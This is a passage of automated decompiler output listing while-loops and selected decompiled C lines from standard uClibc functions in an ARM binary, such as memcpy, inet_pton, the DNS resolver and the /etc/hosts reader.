++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 143 @ __heap_free ====================================
++++++++ WHILE START : 43205 
++++++++ WHILE FUNCTION : __heap_free 
++++++++ WHILE END : 43273 
++++++++ INTRESTING INSTRUCTIONS :  
		__heap_link_free_area_after();
		__heap_link_free_area_after();
		__heap_link_free_area();
		__heap_link_free_area();
=============================WHILE LOOPS ID : 145 @ srandom_r ====================================
++++++++ WHILE START : 44862 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 44872 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)(int32_t)a1, (int32_t)&v160);
=============================WHILE LOOPS ID : 154 @ __stdio_WRITE ====================================
++++++++ WHILE START : 51653 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 51730 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 157 @ _fpmaxtostr ====================================
++++++++ WHILE START : 53141 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 56422 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 166 @ _memcpy ====================================
++++++++ WHILE START : 58274 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 58406 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 169 @ _memcpy ====================================
++++++++ WHILE START : 58524 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 58587 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 172 @ _memcpy ====================================
++++++++ WHILE START : 58632 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 58695 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 173 @ _memcpy ====================================
++++++++ WHILE START : 58704 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 58767 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 177 @ _memcpy ====================================
++++++++ WHILE START : 58946 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 58981 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 180 @ _memcpy ====================================
++++++++ WHILE START : 59053 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 59088 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 181 @ _memcpy ====================================
++++++++ WHILE START : 59123 
++++++++ WHILE FUNCTION : _memcpy 
++++++++ WHILE END : 59186 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 182 @ __GI_memchr ====================================
++++++++ WHILE START : 59708 
++++++++ WHILE FUNCTION : __GI_memchr 
++++++++ WHILE END : 59823 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 185 @ memrchr ====================================
++++++++ WHILE START : 60182 
++++++++ WHILE FUNCTION : memrchr 
++++++++ WHILE END : 60288 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 188 @ __GI_strpbrk ====================================
++++++++ WHILE START : 60661 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 60694 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 189 @ inet_aton ====================================
++++++++ WHILE START : 60859 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 60946 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 190 @ __dns_lookup ====================================
++++++++ WHILE START : 61135 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 61942 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		int32_t v179 = inet_pton(10, (char *)v160, (int32_t)&v178); // 0x18e2c
		inet_addr(v160);
		int32_t v182 = socket(); // 0x18e8c
		if (__libc_connect(v182, (struct sockaddr *)&v158, 28) < 0) {
		__libc_send(v182, (int32_t *)v144, result2 + v172, 0);
		int32_t v192 = __libc_recv(v182, (int32_t *)v144, 512, v190, (int32_t)&v191); // 0x18f30
		free();
		free();
		while (true) {
		while (true) {
		__libc_close(v182);
		free();
		free();
		__libc_close(v182);
		free();
		free();
		free();
		__libc_close(v182);
		free();
		free();
		__libc_close(v182);
		free();
		free();
		free();
		free();
		__libc_close(v182);
		free();
		free();
		__libc_close(v182);
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		free();
		free();
=============================WHILE LOOPS ID : 191 @ __open_nameservers ====================================
++++++++ WHILE START : 62397 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 62623 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (fgets(v150, 128, v154) == 0) {
		free();
		free();
		while (true) {
		if (fgets(v150, 128, v154) == 0) {
		if (fgets(v150, 128, v154) == 0) {
=============================WHILE LOOPS ID : 194 @ __GI_strspn ====================================
++++++++ WHILE START : 65557 
++++++++ WHILE FUNCTION : __GI_strspn 
++++++++ WHILE END : 65592 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 197 @ inet_pton ====================================
++++++++ WHILE START : 66228 
++++++++ WHILE FUNCTION : inet_pton 
++++++++ WHILE END : 66347 
++++++++ INTRESTING INSTRUCTIONS :  
		if (inet_pton4((char *)v158, v156) >= 1) {
		while (true) {
=============================WHILE LOOPS ID : 199 @ __GI_inet_ntop ====================================
++++++++ WHILE START : 66740 
++++++++ WHILE FUNCTION : __GI_inet_ntop 
++++++++ WHILE END : 67053 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		if (inet_ntop4(a2 + 12, v180, v153 - v180 - 32) == 0) {
		v186 = sprintf(v180, (int32_t)"%x", v184, v185, (int32_t)&v187, (int32_t)&v187);
		if (inet_ntop4(a2 + 12, v180, v153 - v180 - 32) == 0) {
		v186 = sprintf(v180, (int32_t)"%x", v184, v185, (int32_t)&v187, (int32_t)&v187);
		while (true) {
=============================WHILE LOOPS ID : 200 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68278 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68291 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v157, v161, v162) != 0) {
		__GI_fclose((char *)v162);
=============================WHILE LOOPS ID : 201 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68342 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68355 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v157, v161, v162) != 0) {
		__GI_fclose((char *)v162);
=============================WHILE LOOPS ID : 202 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68431 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68444 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v157, v161, v162) != 0) {
		__GI_fclose((char *)v162);
=============================WHILE LOOPS ID : 203 @ __read_etc_hosts_r ====================================
++++++++ WHILE START : 68469 
++++++++ WHILE FUNCTION : __read_etc_hosts_r 
++++++++ WHILE END : 68700 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v157, v161, v162) == 0) {
		__GI_fclose((char *)v162);
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (__GI_strcasecmp(v176, v201) == 0) {
		if (inet_pton(2, (char *)v203, v160) > 0) {
		__GI_fclose((char *)v162);
		if (inet_pton(10, (char *)v204, v170) > 0) {
		__GI_fclose((char *)v162);
		while (true) {
		if (fgets(v205, v206, v162) != 0) {
		int32_t v208 = __GI_fclose((char *)v162); // 0x1a9f4
=============================WHILE LOOPS ID : 205 @ __decode_dotted ====================================
++++++++ WHILE START : 69472 
++++++++ WHILE FUNCTION : __decode_dotted 
++++++++ WHILE END : 69555 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 207 @ __aeabi_idiv ====================================
++++++++ WHILE START : 70084 
++++++++ WHILE FUNCTION : __aeabi_idiv 
++++++++ WHILE END : 70312 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
